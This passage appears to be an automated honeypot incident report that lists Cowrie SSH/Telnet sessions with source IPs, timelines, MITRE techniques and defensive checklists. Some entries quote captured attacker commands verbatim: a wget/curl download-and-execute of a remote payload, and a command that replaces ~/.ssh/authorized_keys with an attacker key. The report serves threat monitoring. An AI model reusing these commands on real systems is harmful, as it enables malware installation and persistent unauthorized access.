| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:13:54` | `cowrie.session.connect` |
| `2026-08-24 07:13:54` | `cowrie.client.version` |
| `2026-08-24 07:13:54` | `cowrie.client.kex` |
| `2026-08-24 07:13:55` | `cowrie.login.success` |
| `2026-08-24 07:13:55` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:13:55` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 07:13:55` | `cowrie.direct-tcpip.data` |
| `2026-08-24 07:13:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1dd7e8e8b872

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 07:13 |
| **Last Seen** | 2026-08-24 07:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:13:57` | `cowrie.session.connect` |
| `2026-08-24 07:13:57` | `cowrie.client.version` |
| `2026-08-24 07:13:58` | `cowrie.client.kex` |
| `2026-08-24 07:13:59` | `cowrie.login.success` |
| `2026-08-24 07:13:59` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:13:59` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 07:13:59` | `cowrie.direct-tcpip.data` |
| `2026-08-24 07:13:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6788295f2e55

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 07:23 |
| **Last Seen** | 2026-08-24 07:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:23:28` | `cowrie.session.connect` |
| `2026-08-24 07:23:28` | `cowrie.client.version` |
| `2026-08-24 07:23:28` | `cowrie.client.kex` |
| `2026-08-24 07:23:30` | `cowrie.login.success` |
| `2026-08-24 07:23:30` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:23:30` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 07:23:30` | `cowrie.direct-tcpip.data` |
| `2026-08-24 07:23:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7eb394dac1f

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 07:23 |
| **Last Seen** | 2026-08-24 07:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:23:32` | `cowrie.session.connect` |
| `2026-08-24 07:23:32` | `cowrie.client.version` |
| `2026-08-24 07:23:32` | `cowrie.client.kex` |
| `2026-08-24 07:23:33` | `cowrie.login.success` |
| `2026-08-24 07:23:33` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:23:33` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 07:23:33` | `cowrie.direct-tcpip.data` |
| `2026-08-24 07:23:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47d410cec23a

| Field | Detail |
|---|---|
| **Source IP** | `186.242.162[.]94` |
| **First Seen** | 2026-08-24 07:24 |
| **Last Seen** | 2026-08-24 07:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:24:34` | `cowrie.session.connect` |
| `2026-08-24 07:24:39` | `cowrie.telnet.option` |
| `2026-08-24 07:24:42` | `cowrie.login.success` |
| `2026-08-24 07:24:43` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `186.242.162[.]94` to AbuseIPDB if not already reported
- [ ] Block `186.242.162[.]94` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98b12910e359

| Field | Detail |
|---|---|
| **Source IP** | `81.214.75[.]248` |
| **First Seen** | 2026-08-24 07:27 |
| **Last Seen** | 2026-08-24 07:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:27:47` | `cowrie.session.connect` |
| `2026-08-24 07:27:47` | `cowrie.client.version` |
| `2026-08-24 07:27:47` | `cowrie.client.kex` |
| `2026-08-24 07:27:48` | `cowrie.login.success` |
| `2026-08-24 07:27:49` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:27:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.214.75[.]248` to AbuseIPDB if not already reported
- [ ] Block `81.214.75[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d70d83bd74e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 07:33 |
| **Last Seen** | 2026-08-24 07:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:33:07` | `cowrie.session.connect` |
| `2026-08-24 07:33:07` | `cowrie.client.version` |
| `2026-08-24 07:33:07` | `cowrie.client.kex` |
| `2026-08-24 07:33:08` | `cowrie.login.success` |
| `2026-08-24 07:33:08` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:33:08` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 07:33:08` | `cowrie.direct-tcpip.data` |
| `2026-08-24 07:33:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e83035f7d72

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 07:33 |
| **Last Seen** | 2026-08-24 07:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:33:10` | `cowrie.session.connect` |
| `2026-08-24 07:33:10` | `cowrie.client.version` |
| `2026-08-24 07:33:11` | `cowrie.client.kex` |
| `2026-08-24 07:33:11` | `cowrie.login.success` |
| `2026-08-24 07:33:12` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:33:12` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 07:33:12` | `cowrie.direct-tcpip.data` |
| `2026-08-24 07:33:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2f8df3a209f

| Field | Detail |
|---|---|
| **Source IP** | `35.130.111[.]146` |
| **First Seen** | 2026-08-24 07:37 |
| **Last Seen** | 2026-08-24 07:42 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:37:15` | `cowrie.session.connect` |
| `2026-08-24 07:37:16` | `cowrie.client.version` |
| `2026-08-24 07:37:16` | `cowrie.client.kex` |
| `2026-08-24 07:37:17` | `cowrie.login.success` |
| `2026-08-24 07:37:17` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:42:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.130.111[.]146` to AbuseIPDB if not already reported
- [ ] Block `35.130.111[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a00ca2f4402

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]14` |
| **First Seen** | 2026-08-24 07:37 |
| **Last Seen** | 2026-08-24 07:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:37:30` | `cowrie.session.connect` |
| `2026-08-24 07:37:31` | `cowrie.client.version` |
| `2026-08-24 07:37:31` | `cowrie.client.kex` |
| `2026-08-24 07:37:33` | `cowrie.login.success` |
| `2026-08-24 07:37:34` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:37:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]14` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f92495640e3

| Field | Detail |
|---|---|
| **Source IP** | `65.20.217[.]64` |
| **First Seen** | 2026-08-24 07:37 |
| **Last Seen** | 2026-08-24 07:37 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:37:39` | `cowrie.session.connect` |
| `2026-08-24 07:37:40` | `cowrie.client.version` |
| `2026-08-24 07:37:40` | `cowrie.client.kex` |
| `2026-08-24 07:37:41` | `cowrie.login.success` |
| `2026-08-24 07:37:42` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:37:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.217[.]64` to AbuseIPDB if not already reported
- [ ] Block `65.20.217[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9b3052979a1

| Field | Detail |
|---|---|
| **Source IP** | `78.187.9[.]53` |
| **First Seen** | 2026-08-24 07:41 |
| **Last Seen** | 2026-08-24 07:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:41:49` | `cowrie.session.connect` |
| `2026-08-24 07:41:50` | `cowrie.client.version` |
| `2026-08-24 07:41:50` | `cowrie.client.kex` |
| `2026-08-24 07:41:51` | `cowrie.login.success` |
| `2026-08-24 07:41:52` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:41:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.187.9[.]53` to AbuseIPDB if not already reported
- [ ] Block `78.187.9[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75aa1dd6e944

| Field | Detail |
|---|---|
| **Source IP** | `118.163.145[.]175` |
| **First Seen** | 2026-08-24 07:42 |
| **Last Seen** | 2026-08-24 07:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:42:01` | `cowrie.session.connect` |
| `2026-08-24 07:42:02` | `cowrie.client.version` |
| `2026-08-24 07:42:02` | `cowrie.client.kex` |
| `2026-08-24 07:42:04` | `cowrie.login.success` |
| `2026-08-24 07:42:05` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:42:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.163.145[.]175` to AbuseIPDB if not already reported
- [ ] Block `118.163.145[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bb70cdadf7c

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]26` |
| **First Seen** | 2026-08-24 07:45 |
| **Last Seen** | 2026-08-24 07:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `(cd /tmp; wget hxxp://5.182.210[.]174/ok; curl -O hxxp://5.182.210[.]174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &, cd /tmp, wget hxxp://5.182.210[.]174/ok, curl -O hxxp://5.182.210[.]174/ok, chmod +x ok` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:45:22` | `cowrie.session.connect` |
| `2026-08-24 07:45:22` | `cowrie.telnet.option` |
| `2026-08-24 07:45:22` | `cowrie.login.success` |
| `2026-08-24 07:45:23` | `cowrie.session.params` |
| `2026-08-24 07:45:23` | `cowrie.telnet.option` |
| `2026-08-24 07:45:23` | `cowrie.telnet.option` |
| `2026-08-24 07:45:23` | `cowrie.command.input` |
| `2026-08-24 07:45:23` | `cowrie.command.input` |
| `2026-08-24 07:45:23` | `cowrie.command.input` |
| `2026-08-24 07:45:23` | `cowrie.command.input` |
| `2026-08-24 07:45:23` | `cowrie.command.input` |
| `2026-08-24 07:45:23` | `cowrie.command.input` |
| `2026-08-24 07:45:23` | `cowrie.command.input` |
| `2026-08-24 07:45:23` | `cowrie.command.input` |
| `2026-08-24 07:45:23` | `cowrie.command.failed` |
| `2026-08-24 07:45:23` | `cowrie.command.input` |
| `2026-08-24 07:45:23` | `cowrie.command.input` |
| `2026-08-24 07:45:23` | `cowrie.command.input` |
| `2026-08-24 07:45:23` | `cowrie.command.input` |
| `2026-08-24 07:45:23` | `cowrie.command.input` |
| `2026-08-24 07:45:23` | `cowrie.command.input` |
| `2026-08-24 07:45:23` | `cowrie.command.success` |
| `2026-08-24 07:45:23` | `cowrie.command.input` |
| `2026-08-24 07:45:23` | `cowrie.command.input` |
| `2026-08-24 07:45:23` | `cowrie.command.failed` |
| `2026-08-24 07:45:23` | `cowrie.command.input` |
| `2026-08-24 07:45:23` | `cowrie.command.input` |
| `2026-08-24 07:45:23` | `cowrie.command.success` |
| `2026-08-24 07:45:23` | `cowrie.command.input` |
| `2026-08-24 07:45:23` | `cowrie.command.input` |
| `2026-08-24 07:45:23` | `cowrie.command.failed` |
| `2026-08-24 07:45:23` | `cowrie.command.input` |
| `2026-08-24 07:45:23` | `cowrie.command.input` |
| `2026-08-24 07:45:23` | `cowrie.command.success` |
| `2026-08-24 07:45:23` | `cowrie.command.input` |
| `2026-08-24 07:45:23` | `cowrie.command.failed` |
| `2026-08-24 07:45:23` | `cowrie.command.input` |
| `2026-08-24 07:45:23` | `cowrie.log.closed` |
| `2026-08-24 07:45:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]26` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cd2a4d0d154

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 07:45 |
| **Last Seen** | 2026-08-24 07:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:45:57` | `cowrie.session.connect` |
| `2026-08-24 07:45:57` | `cowrie.client.version` |
| `2026-08-24 07:45:58` | `cowrie.client.kex` |
| `2026-08-24 07:45:59` | `cowrie.login.success` |
| `2026-08-24 07:45:59` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:45:59` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 07:45:59` | `cowrie.direct-tcpip.data` |
| `2026-08-24 07:45:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cf773fcfe27

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-24 07:46 |
| **Last Seen** | 2026-08-24 07:46 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:46:01` | `cowrie.session.connect` |
| `2026-08-24 07:46:01` | `cowrie.client.version` |
| `2026-08-24 07:46:01` | `cowrie.client.kex` |
| `2026-08-24 07:46:02` | `cowrie.login.success` |
| `2026-08-24 07:46:02` | `cowrie.direct-tcpip.request` |
| `2026-08-24 07:46:02` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-24 07:46:02` | `cowrie.direct-tcpip.data` |
| `2026-08-24 07:46:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24e7ef16fc6a

| Field | Detail |
|---|---|
| **Source IP** | `106.13.46[.]38` |
| **First Seen** | 2026-08-24 07:49 |
| **Last Seen** | 2026-08-24 07:49 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:49:37` | `cowrie.session.connect` |
| `2026-08-24 07:49:37` | `cowrie.client.version` |
| `2026-08-24 07:49:37` | `cowrie.client.kex` |
| `2026-08-24 07:49:39` | `cowrie.login.success` |
| `2026-08-24 07:49:40` | `cowrie.session.params` |
| `2026-08-24 07:49:40` | `cowrie.command.input` |
| `2026-08-24 07:49:40` | `cowrie.command.failed` |
| `2026-08-24 07:49:40` | `cowrie.log.closed` |
| `2026-08-24 07:49:41` | `cowrie.session.params` |
| `2026-08-24 07:49:41` | `cowrie.command.input` |
| `2026-08-24 07:49:42` | `cowrie.session.file_download` |
| `2026-08-24 07:49:42` | `cowrie.log.closed` |
| `2026-08-24 07:49:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.46[.]38` to AbuseIPDB if not already reported
- [ ] Block `106.13.46[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fb49cbb0916

| Field | Detail |
|---|---|
| **Source IP** | `106.13.46[.]38` |
| **First Seen** | 2026-08-24 07:49 |
| **Last Seen** | 2026-08-24 07:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:49:42` | `cowrie.session.connect` |
| `2026-08-24 07:49:42` | `cowrie.client.version` |
| `2026-08-24 07:49:42` | `cowrie.client.kex` |
| `2026-08-24 07:49:43` | `cowrie.login.success` |
| `2026-08-24 07:49:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.46[.]38` to AbuseIPDB if not already reported
- [ ] Block `106.13.46[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cf329d9edce

| Field | Detail |
|---|---|
| **Source IP** | `106.13.46[.]38` |
| **First Seen** | 2026-08-24 07:49 |
| **Last Seen** | 2026-08-24 07:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:49:43` | `cowrie.session.connect` |
| `2026-08-24 07:49:43` | `cowrie.client.version` |
| `2026-08-24 07:49:44` | `cowrie.client.kex` |
| `2026-08-24 07:49:45` | `cowrie.login.success` |
| `2026-08-24 07:49:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.46[.]38` to AbuseIPDB if not already reported
- [ ] Block `106.13.46[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-14b08b978d51

| Field | Detail |
|---|---|
| **Source IP** | `85.239.149[.]72` |
| **First Seen** | 2026-08-24 07:49 |
| **Last Seen** | 2026-08-24 07:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:49:57` | `cowrie.session.connect` |
| `2026-08-24 07:49:57` | `cowrie.client.version` |
| `2026-08-24 07:49:57` | `cowrie.client.kex` |
| `2026-08-24 07:49:58` | `cowrie.login.success` |
| `2026-08-24 07:49:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.239.149[.]72` to AbuseIPDB if not already reported
- [ ] Block `85.239.149[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68ec8640fa33

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-08-24 07:49 |
| **Last Seen** | 2026-08-24 07:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp || cd /var/tmp || cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.p` |
| **Download Attempts** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca, ae8d459595257f2f22c9d1ff74c4fb8a91643fad7899b57556496716692b904e |
| **Malware Analysis** | 0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1105 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-24 07:49:58` | `cowrie.session.connect` |
| `2026-08-24 07:49:58` | `cowrie.client.version` |
| `2026-08-24 07:49:58` | `cowrie.client.kex` |
| `2026-08-24 07:49:58` | `cowrie.login.success` |
| `2026-08-24 07:50:01` | `cowrie.session.params` |
| `2026-08-24 07:50:01` | `cowrie.command.input` |
| `2026-08-24 07:50:01` | `cowrie.session.file_download` |
| `2026-08-24 07:50:01` | `cowrie.session.file_download` |
| `2026-08-24 07:50:01` | `cowrie.log.closed` |
| `2026-08-24 07:50:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82d5ac55cd48

| Field | Detail |
|---|---|
| **Source IP** | `103.188.177[.]46` |
| **First Seen** | 2026-08-24 07:52 |
| **Last Seen** | 2026-08-24 07:52 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
